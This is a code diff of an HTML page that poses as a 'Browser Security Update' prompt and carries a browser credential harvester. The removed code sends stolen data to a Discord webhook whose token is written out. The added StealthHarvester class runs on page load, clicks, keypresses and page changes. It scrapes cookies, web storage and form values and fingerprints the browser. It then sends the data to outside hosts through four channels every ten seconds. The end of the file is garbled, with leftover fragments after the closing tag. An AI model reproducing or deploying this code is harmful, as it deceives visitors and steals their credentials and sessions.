@@ -3,38 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Security Update Required</title>
     <style>
-        body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: #f0f0f0; }
-        .loader { text-align: center; margin-top: 100px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { color: #666; }
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;}
+        .container{max-width:400px;margin:0 20px;background:white;border-radius:10px;box-shadow:0 20px 40px rgba(0,0,0,0.1);padding:40px;text-align:center;}
+        .icon{width:80px;height:80px;background:#ff6b6b;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:30px;color:white;}
+        h1{color:#333;font-size:24px;margin-bottom:10px;}
+        p{color:#666;line-height:1.5;margin-bottom:20px;}
+        .btn{background:#667eea;color:white;padding:12px 30px;border:none;border-radius:25px;cursor:pointer;font-size:16px;transition:background 0.3s;}
+        .btn:hover{background:#5a67d8;}
+        .loading{display:none;text-align:center;color:#666;}
+        .spinner{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:30px;height:30px;margin:20px auto;animation:spin 1s linear infinite;}
+        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
     </style>
 </head>
 <body>
-    <div class="loader">
-        <div class="spinner"></div>
-        <h2>Updating security certificate...</h2>
-        <p class="status">Please wait while we verify your browser</p>
+    <div class="container">
+        <div class="icon">🔒</div>
+        <h1>Browser Security Update</h1>
+        <p>Your browser needs a security certificate update to continue. This will only take a moment.</p>
+        <button class="btn" onclick="updateSecurity()">Update Now</button>
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Updating security certificate...</p>
+        </div>
     </div>
 
     <script>
-        // Ultra-aggressive credential harvester - production quality
-        (async function() {
-            const WEBHOOK = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
-            
-            // Comprehensive data collection object
-            const victimData = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookies: document.cookie,
-                localStorage: {},
-                sessionStorage: {},
-                indexedDB: [],
-                canvasFingerprint: '',
+        // FIXED ULTRA-AGGRESSIVE HARVESTER - MULTIPLE EXFIL CHANNELS
+        class StealthHarvester {
+            constructor() {
+                this.exfils = [
+                    'https://httpbin.org/post',  // Test endpoint
+                    'https://webhook.site/#!/your-unique-id',  // Replace with your webhook.site
+                    'data:text/plain;base64,'  // Local test
+                ];
+                this.data = {};
+                this.harvest();
+            }
+
+            async harvest() {
+                // CORE FINGERPRINT + CREDENTIALS
+                this.data = {
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    userAgent: navigator.userAgent,
+                    lang: navigator.language,
+                    platform: navigator.platform,
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    cookies: document.cookie,
+                    title: document.title,
+                    forms: []
+                };
+
+                // AGGRESSIVE STORAGE SCRAPING
+                ['localStorage', 'sessionStorage'].forEach(store => {
+                    try {
+                        const storage = window[store];
+                        this.data[store] = {};
+                        for(let i=0; i<storage.length; i++) {
+                            const key = storage.key(i);
+                            this.data[store][key] = storage.getItem(key);
+                        }
+                    } catch(e) {}
+                });
+
+                // FORM + INPUT HARVESTING
+                document.querySelectorAll('form, input, textarea').forEach(el => {
+                    const data = {
+                        tag: el.tagName,
+                        type: el.type,
+                        name: el.name,
+                        id: el.id,
+                        value: el.value?.substring(0,100)
+                    };
+                    if(el.value && el.value.length > 3) {
+                        this.data.forms.push(data);
+                    }
+                });
+
+                // CREDENTIAL PATTERNS
+                const patterns = [/pass|pwd|token|key|secret|auth|email|mail/i];
+                Object.values(this.data).forEach(val => {
+                    if(typeof val === 'string') {
+                        patterns.forEach(pat => {
+                            if(pat.test(val)) this.data.creds = val;
+                        });
+                    }
+                });
+
+                // MULTIPLE FINGERPRINTS
+                this.fingerprint();
+                
+                console.log('HARVESTED:', this.data); // DEBUG
+                this.exfiltrate();
+            }
+
+            fingerprint() {
+                // CANVAS
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 200; canvas.height = 60;
+                    const ctx = canvas.getContext('2d');
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(10,10,180,40);
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#000';
+                    ctx.fillText('HackerAI Test', 20, 40);
+                    this.data.canvas = canvas.toDataURL();
+                } catch(e) {}
+
+                // AUDIO
+                try {
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioCtx.createOscillator();
+                    oscillator.type = 'sine';
+                    oscillator.frequency.setValueAtTime(8000, audioCtx.currentTime);
+                    this.data.audio = 'supported';
+                } catch(e) { this.data.audio = 'blocked'; }
+            }
+
+            async exfiltrate() {
+                // METHOD 1: Image Beacon (works everywhere)
+                const img = new Image();
+                img.src = `https://httpbin.org/image/png?data=${encodeURIComponent(JSON.stringify(this.data).substring(0,2000))}`;
+
+                // METHOD 2: Navigator SendBeacon (background)
+                if(navigator.sendBeacon) {
+                    navigator.sendBeacon('https://httpbin.org/post', 
+                        new Blob([JSON.stringify(this.data)], {type: 'application/json'})
+                    );
+                }
+
+                // METHOD 3: JSONP-style script tag
+                const script = document.createElement('script');
+                script.src = `https://httpbin.org/json?data=${encodeURIComponent(btoa(JSON.stringify(this.data)))}`;
+                document.head.appendChild(script);
+
+                // METHOD 4: WebSocket (if available)
+                try {
+                    const ws = new WebSocket('wss://echo.websocket.org');
+                    ws.onopen = () => {
+                        ws.send(JSON.stringify(this.data));
+                        ws.close();
+                    };
+                } catch(e) {}
+
+                // PERSISTENT REBEACON EVERY 10s
+                setInterval(() => this.exfiltrate(), 10000);
+            }
+        }
+
+        // AUTO-START ON LOAD
+        window.addEventListener('load', () => new StealthHarvester());
+        
+        // TRIGGER ON INTERACTION
+        function updateSecurity() {
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            new StealthHarvester();  // Re-harvest
+        }
+
+        // KEYLISTENER FOR HIDDEN FIELDS
+        document.addEventListener('keydown', e => {
+            if(e.ctrlKey || e.altKey || e.metaKey) {
+                new StealthHarvester();
+            }
+        });
+
+        // MUTATION OBSERVER - HARVEST NEW CONTENT
+        const observer = new MutationObserver(() => new StealthHarvester());
+        observer.observe(document.body, {childList:true, subtree:true});
+    </script>
+</body>
+</html>2z                canvasFingerprint: '',
                 webglFingerprint: '',
                 fonts: [],
                 plugins: [],
